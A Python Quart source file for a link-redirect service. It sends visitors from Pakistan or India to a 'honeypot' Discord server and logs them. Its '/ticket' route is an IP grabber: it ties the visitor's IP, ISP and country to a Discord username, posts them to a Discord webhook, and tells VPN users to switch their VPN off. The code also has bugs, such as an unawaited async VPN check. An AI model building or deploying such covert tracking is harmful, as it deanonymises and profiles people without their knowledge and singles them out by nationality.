"""
GeoIP Redirect Service

This service redirects users based on their country of origin using GeoIP data. 
Users from Pakistan or India will be redirected to an alternative server, while users from other countries will be redirected to a default subdomain.

Dependencies:
- quart: An asynchronous web microframework for Python.

"""

import ipaddress
import requests
from logger import Logger
from json_handler import *
from quart import Quart, jsonify, redirect, render_template, request

app = Quart(__name__)
l = Logger(console_log= True, file_logging=True, file_URI='logs/log.txt', override=True)
default_server:str
alternative_server_url:str
test_flag:bool
redirected:bool
config:dict
sub_nets: list

def read_subnets_from_file(filename):
    global sub_nets
    """
    Read subnets from a text file.

    Parameters:
    filename (str): Name of the text file containing subnets.

    Returns:
    list: List of subnets in CIDR notation.
    """
    subnets = []
    try:
        with open(filename, 'r') as file:
            for line in file:
                line = line.strip()
                if line:  # Skip empty lines
                    subnets.append(line)
        return subnets
    except FileNotFoundError:
        print("File not found.")
        return []

def ip_in_subnet(ip, subnet):
    """
    Check if an IP address belongs to a subnet.

    Parameters:
    ip (str): IP address.
    subnet (str): Subnet in CIDR notation.

    Returns:
    bool: True if IP address belongs to subnet, False otherwise.
    """
    try:
        ip_obj = ipaddress.ip_address(ip)
        subnet_obj = ipaddress.ip_network(subnet)
        return ip_obj in subnet_obj
    except ValueError as e:
        print("Error:", e)
        return False
    
async def check_for_vpn(ip):
    global sub_nets
    return any(ip_in_subnet(ip, subnet) for subnet in sub_nets)

def send_to_channel(message:str):
    """
    Sends a message using Discord webhook.

    Args:
    - message (str): The message to send.
    - webhook_url (str): The URL of the Discord webhook.

    Returns:
    - bool: True if the message was sent successfully, False otherwise.
    """
    global config
    
    # Create payload
    payload = {
        "content": message
    }

    try:
        # Send POST request to the webhook URL
        response = requests.post(config["dc_webhook_url"], json=payload)
        response.raise_for_status()  # Raise an exception for any HTTP error status

        # Check if the message was sent successfully
        if response.status_code == 204:
            l.passing("Message sent successfully")
            return True
        else:
            l.error(f"Failed to send message. Status code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        l.error(f"Failed to send message: {e}")
        return False


async def get_country(ip_address):
    """Retrieve country information for the given IP address."""
    try:
        response = await request_ip_location(ip_address)
        if response and response.get("response_code") == "200":
            country_code = response.get("country_code2")
            return country_code
    except Exception as e:
        l.error(f"Error fetching country information: {e}")
    return None

async def request_ip_location(ip_address):
    """Make a request to the IP location API."""
    url = f"https://api.iplocation.net/?cmd=ip-country&ip={ip_address}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.json()
    except Exception as e:
        l.error(f"Error fetching IP location: {e}")
    return None

async def redirect_handler(ip ,normal_server, honeypot):
    global redirected
    country_code = await get_country(ip)
    l.info(f'Country code is: {country_code}')
    #if test flag is set redirect every 2nd request to honeypot
    if test_flag:
        if redirected:
            country_code = 'PK'
            l.info(f'Test flag, changed coutry code: {country_code}')
        else:
            l.info(f'Test flag, not changing coutry code')
        redirected = not redirected
        
    if country_code and country_code in ['PK', 'IN']:
        l.info(f"Rediredcting to Honeypot: {honeypot}")
        send_to_channel(f'''
Honeypot triggered:
Honeypot: {honeypot}
IP: {ip}
Country: {country_code}
More infos: https://iplocation.com/?ip={ip}
''')
        return redirect(honeypot)
    elif check_for_vpn(ip):
        return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to join the Discord.'
    
    else:
        l.info(f"Rediredcting to: {normal_server}")
        return redirect(normal_server)

@app.route('/')
async def index():
    l.info('Default route called.')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    try:
        return await redirect_handler(ip_address, default_server, alternative_server_url)
    except Exception as e:
        l.error(f'{e}')
        
@app.route('/ticket/<path:dc_handle>')
async def ip_grab(dc_handle):
    l.info('Grabber called.')
    l.info(f'user is: {dc_handle}')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    vpn = check_for_vpn(ip_address)
    try:
        data = await request_ip_location(ip_address)
        ip = data['ip']
        ip_number = data['ip_number']
        ip_version = data['ip_version']
        country_name = data['country_name']
        country_code2 = data['country_code2']
        isp = data['isp']
        l.info(f'data is: {data}\nVPN: {vpn}')
        send_to_channel(f'''
IP Grabber called:
Username provided: {dc_handle}
IP: {ip_address}
VPN: {vpn}
Country: {country_name}/{country_code2}
More infos: https://iplocation.com/?ip={ip_address}
''')
        if vpn:
            return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to create a ticket.'

        dc_handle += '?'
        return await render_template('result.html',dc_handle = dc_handle, ip=ip, ip_number=ip_number, ip_version=ip_version,
                                country_name=country_name, country_code2=country_code2, isp=isp)
    except Exception as e:
            l.error(f'{e}')
    return
   
@app.route('/<path:dc_invite>')
async def refer(dc_invite):
    l.info('Custom route called.')
    l.info(f'Route is: {dc_invite}')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    custom_server = f'https://discord.gg/{dc_invite}'
    try:
        return await redirect_handler(ip_address, custom_server, alternative_server_url)
    except Exception as e:
            l.error(f'{e}')
    
@app.route('/<path:dc_invite>/<path:honeypot>')
async def refer_custom(dc_invite, honeypot):
    l.info('Custom route called with custom honeypot.')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    l.info(f'Route is: {dc_invite}/{honeypot}')
    custom_server = f'https://discord.gg/{dc_invite}'
    custom_honeypot = f'https://discord.gg/{honeypot}'
    try:
        return await redirect_handler(ip_address, custom_server, custom_honeypot)
    except Exception as e:
            l.error(f'{e}')

@app.route('/favicon.ico')
async def favicon():
    return 404

if __name__ == '__main__':
    
    config = read_json_file('config.json')
    test_flag = config['test_flag']
    redirected = False
    if test_flag:
        l.passing('Test flag is set, every second request will be directed to the honey pot')
    default_server = config['default_server']

    alternative_server_url = config['honeypot_server']
    
    app_port = int(config['app_port'])
    
    
    app.run(host='0.0.0.0',port = app_port)